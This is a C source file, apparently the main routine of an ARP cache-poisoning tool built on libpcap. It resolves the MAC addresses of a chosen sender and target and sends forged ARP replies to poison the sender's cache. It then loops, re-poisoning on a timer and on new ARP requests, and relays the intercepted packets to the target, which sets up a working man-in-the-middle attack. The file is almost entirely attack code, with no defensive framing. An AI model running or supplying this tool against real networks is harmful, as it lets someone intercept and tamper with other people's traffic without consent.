#include "utils.h"
#include "packet.h"
#include "address.h"
#include "filter.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

int main(int argc, char* argv[]) {
    
    // 0. Validate arguments
    if(check_args(argc, argv[0])) return -1;

    // 1. Open Device
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = argv[1];
    bpf_u_int32 net, mask;
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "[-] Failed fetching netmask from device [%s]\n%s\n", dev, errbuf);
        return -1;
    }
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
    if(handle == NULL){
        fprintf(stderr, "[-] Failed opening device [%s]\n%s\n", dev, errbuf);
        return -1;
    }

    // 2. Store Sender / Target IP address
    BYTE sender_IP[IP_ADDR_LEN], target_IP[IP_ADDR_LEN];
    parse_bytes(sender_IP, '.', argv[2], IP_ADDR_LEN, DEC);
    parse_bytes(target_IP, '.', argv[3], IP_ADDR_LEN, DEC);

    // 3. Fetch Localhost HW Address
    BYTE attacker_IP[IP_ADDR_LEN], attacker_MAC[HW_ADDR_LEN];
    char attacker_MAC_str[HW_ADDR_LEN * 2 + 1];
    get_HW_IP(attacker_MAC, attacker_IP, dev);
    addr_to_str(attacker_MAC_str, "Attacker MAC", attacker_MAC);

    // 4. Initial Infection
    BYTE sender_MAC[HW_ADDR_LEN], target_MAC[HW_ADDR_LEN];
    char sender_MAC_str[HW_ADDR_LEN * 2 + 1], target_MAC_str[HW_ADDR_LEN * 2 + 1];
    send_arp(handle, OP_REQ, attacker_MAC, attacker_IP, NULL, sender_IP);
    get_host_MAC(sender_MAC, attacker_MAC, sender_IP, handle);
    addr_to_str(sender_MAC_str, "Sender MAC", sender_MAC);
    send_arp(handle, OP_REQ, attacker_MAC, attacker_IP, NULL, target_IP);
    get_host_MAC(target_MAC, attacker_MAC, target_IP, handle);
    addr_to_str(target_MAC_str, "Target MAC", target_MAC);
    send_arp(handle, OP_RES, attacker_MAC, target_IP, sender_MAC, sender_IP);

    // 5. Packet Relay & Flooding
    fprintf(stdout, "\n[*] Now we're floodin... ( Ctrl + C to stop )\n");
    time_t timestamp = time(NULL);
    while(TRUE) {
        time_t cur_time = time(NULL);
        if(cur_time-timestamp > PERIOD) {
            send_arp(handle, OP_RES, attacker_MAC, target_IP, sender_MAC, sender_IP);
            timestamp = cur_time;
        }
        struct pcap_pkthdr *header; const BYTE *data;
        int res = pcap_next_ex(handle, &header, &data);
        if(pcap_next_handler(res, header) == FAIL) return -1;
        if(check_request(data, sender_MAC, attacker_IP) == SUCCESS) {
            fprintf(stdout, "[!] There was an additional request\n");
            send_arp(handle, OP_RES, attacker_MAC, target_IP, sender_MAC, sender_IP);
        }
        else if(check_relay(data, sender_MAC, attacker_IP) == SUCCESS) {
            ETH *eth_hdr = (ETH*)data;
            memcpy(eth_hdr->dst_hw_addr, target_MAC, HW_ADDR_LEN);
            memcpy(eth_hdr->src_hw_addr, attacker_MAC, HW_ADDR_LEN);
            if(pcap_sendpacket(handle, (const BYTE*)eth_hdr, header->caplen) != 0)
                fprintf(stderr, "[-] Failed sending packet\n");
        }
    }
    pcap_close(handle);
    return 0;
}